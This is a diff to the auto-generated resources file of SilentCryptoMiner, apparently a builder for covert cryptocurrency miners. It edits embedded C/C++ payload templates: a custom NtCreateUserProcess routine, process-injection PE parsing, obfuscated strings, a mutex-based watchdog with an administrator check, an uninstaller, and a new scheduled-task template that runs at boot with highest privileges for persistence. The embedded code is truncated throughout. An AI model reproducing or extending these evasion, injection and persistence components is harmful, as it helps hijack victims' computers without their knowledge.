@@ -97,18 +97,13 @@ namespace SilentCryptoMiner.Properties {
         ///#include &quot;ntddk.h&quot;
         ///#include &quot;obfuscateu.h&quot;
         ///
-        ///#include &lt;wchar.h&gt;
+        ///void init_unicode_string(PUNICODE_STRING target_string, wchar_t* source_string, SIZE_T length) {
+        ///    target_string-&gt;MaximumLength = (USHORT)(length * sizeof(WCHAR) + 1);
+        ///    target_string-&gt;Length  = (USHORT)(wcslen(source_string) * sizeof(WCHAR));
+        ///    target_string-&gt;Buffer = source_string;
+        ///}
         ///
-        ///PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, DWORD threadFlags) {
-        ///	/* 
-        ///		Custom NtCreateUserProcess creation painstakingly made by Unam Sanctam https://github.com/UnamSanctam
-        ///	*/
-        ///    HANDLE hParent = NULL;
-        ///    PVOID buffer = NULL;
-        ///    SIZE_T bufferLength = 0;
-        ///    NTSTATUS status = -1;
-        ///    while (true) {
-        ///        st [rest of string was truncated]&quot;;.
+        ///PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, D [rest of string was truncated]&quot;;.
         /// </summary>
         public static string common_cpp {
             get {
@@ -119,21 +114,19 @@ namespace SilentCryptoMiner.Properties {
         /// <summary>
         ///   Looks up a localized string similar to #pragma once
         ///
-        ///#include &lt;windows.h&gt;
+        ///#include &quot;ntddk.h&quot;
+        ///
+        ///void init_unicode_string(PUNICODE_STRING target_string, wchar_t* source_string, SIZE_T length);
         ///
         ///PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, DWORD threadFlags);
         ///
         ///bool has_gpu();
         ///
+        ///void format_string(wchar_t* dest, const wchar_t* format, va_list args);
+        ///
         ///void run_program(bool wait, wchar_t* startDir, wchar_t* programPath, wchar_t* cmdLine, ...);
         ///
-        ///bool check_mutex(wchar_t* mutex);
-        ///
-        ///void combine_path(wchar_t* src, wchar_t* base_path, wchar_t* ext_path);
-        ///
-        ///wchar_t* get_env(wchar_t* env, wchar_t* env_name);
-        ///
-        ///HANDLE create_directory(wch [rest of string was truncated]&quot;;.
+        ///void cipher(unsigned  [rest of string was truncated]&quot;;.
         /// </summary>
         public static string common_h {
             get {
@@ -217,9 +210,7 @@ namespace SilentCryptoMiner.Properties {
         ///#include &quot;ntddk.h&quot;
         ///#include &quot;common.h&quot;
         ///
-        ///#include &lt;wchar.h&gt;
-        ///
-        ///BYTE* get_nt_hrds(const BYTE *pe_buffer)
+        ///BYTE* get_nt_hrds(const BYTE* pe_buffer)
         ///{
         ///    if (pe_buffer == NULL) return NULL;
         ///
@@ -233,7 +224,9 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///    IMAGE_NT_HEADERS32 *inh = (IMAGE_NT_HEADERS32 *)(pe_buffer + pe_offset);
         ///    if (inh-&gt;Signature != IMAGE_NT_SIGNATURE) {
-        ///        retur [rest of string was truncated]&quot;;.
+        ///        return NULL;
+        ///    }
+        ///    re [rest of string was truncated]&quot;;.
         /// </summary>
         public static string inject_cpp {
             get {
@@ -262,17 +255,16 @@ namespace SilentCryptoMiner.Properties {
         ///    &lt;Text Lang=&quot;sv&quot;&gt;Main&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;pl&quot;&gt;Główne&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;es&quot;&gt;Principal&lt;/Text&gt;
-        ///	&lt;Text Lang=&quot;ru&quot;&gt;Основное&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;ru&quot;&gt;Основное&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;ptbr&quot;&gt;Principal&lt;/Text&gt;
         ///  &lt;/Control&gt;
         ///  &lt;Control Name=&quot;tabStartup&quot;&gt;
         ///    &lt;Text Lang=&quot;en&quot;&gt;Startup&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;sv&quot;&gt;Uppstart&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;pl&quot;&gt;Start&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;es&quot;&gt;Inicio&lt;/Text&gt;
-        ///	&lt;Text Lang=&quot;ru&quot;&gt;Автозапуск&lt;/Text&gt;
-        ///  &lt;/Control&gt;
-        ///  &lt;Control Name=&quot;tabAssembly&quot;&gt;
-        ///    [rest of string was truncated]&quot;;.
+        ///    &lt;Text Lang=&quot;ru&quot;&gt;Автозапуск&lt;/Text&gt;
+        ///   [rest of string was truncated]&quot;;.
         /// </summary>
         public static string LocalizedControls {
             get {
@@ -292,11 +284,12 @@ namespace SilentCryptoMiner.Properties {
         
         /// <summary>
         ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
-        ///#include &lt;wchar.h&gt;
         ///
         ///#include &quot;UFiles\common.h&quot;
         ///#include &quot;UFiles\obfuscateu.h&quot;
         ///#include &quot;UFiles\inject.h&quot;
+        ///
+        ///$GLOBALRESOURCES
         ///$RESOURCES
         ///
         ///#if DefProcessProtect
@@ -372,26 +365,6 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] nvrtc_builtins64_112 {
-            get {
-                object obj = ResourceManager.GetObject("nvrtc_builtins64_112", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] nvrtc64_112_0 {
-            get {
-                object obj = ResourceManager.GetObject("nvrtc64_112_0", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized string similar to #pragma once
         ///
         ////* --------------------------------- ABOUT -------------------------------------
@@ -455,6 +428,30 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
+        ///&lt;Task version=&quot;1.3&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;
+        ///  &lt;Triggers&gt;
+        ///    &lt;BootTrigger&gt;
+        ///  	  &lt;Enabled&gt;true&lt;/Enabled&gt;
+        ///    &lt;/BootTrigger&gt;
+        ///  &lt;/Triggers&gt;
+        ///  &lt;Principals&gt;
+        ///    &lt;Principal id=&quot;Author&quot;&gt;
+        ///	  &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+        ///    &lt;/Principal&gt;
+        ///  &lt;/Principals&gt;
+        ///  &lt;Settings&gt;
+        ///    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
+        ///    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
+        ///    &lt;StopIfGoingOnB [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string TaskTemplate {
+            get {
+                return ResourceManager.GetString("TaskTemplate", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
         ///&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;
         ///  &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
@@ -493,6 +490,7 @@ namespace SilentCryptoMiner.Properties {
         ///using System.Security.Principal;
         ///using System.Security.Cryptography;
         ///using System.Runtime.InteropServices;
+        ///using System.Runtime.ExceptionServices;
         ///using System.Text;
         ///using System.Resources;
         ///using System.Threading;
@@ -504,7 +502,7 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///public partial class _rUninstaller_
         ///{
-        ///    private static string libsPath = Path.Combine(Environment.GetFold [rest of string was truncated]&quot;;.
+        ///    private static string li [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Uninstaller {
             get {
@@ -514,26 +512,27 @@ namespace SilentCryptoMiner.Properties {
         
         /// <summary>
         ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
-        ///#include &lt;wchar.h&gt;
         ///
         ///#include &quot;UFiles\common.h&quot;
         ///#include &quot;UFiles\obfuscateu.h&quot;
+        ///
+        ///$GLOBALRESOURCES
         ///
         ///int main(int argc, char *argv[])
         ///{
         ///    HANDLE hMutex;
         ///
         ///    UNICODE_STRING umutex;
-        ///    INIT_UNICODE_STRING(umutex, AYU_OBFUSCATEW(L&quot;\\BaseNamedObjects\\#WATCHDOGID&quot;), MAX_PATH);
+        ///    init_unicode_string(&amp;umutex, AYU_OBFUSCATEW(L&quot;\\BaseNamedObjects\\#WATCHDOGID&quot;), MAX_PATH);
         ///
         ///    OBJECT_ATTRIBUTES attr;
         ///    InitializeObjectAttributes(&amp;attr, &amp;umutex, 0, NULL, NULL);
         ///
-        ///    UtCreateMutant(&amp;hMutex, MUTANT_ALL_ACCESS, &amp;attr, TRUE);
+        ///    if (!NT_SUCCESS(UtCreateMutant(&amp;hMutex, MUTANT_ALL_ACCESS, &amp;attr, TRUE))) {
+        ///        return 0;
+        ///    }
         ///
-        ///    bool isAdmin = check_administrator();
-        ///
-        ///    PUT_PEB_ [rest of string was truncated]&quot;;.
+        ///    bool is [rest of string was truncated]&quot;;.
         /// </summary>
         public static string watchdog {
             get {
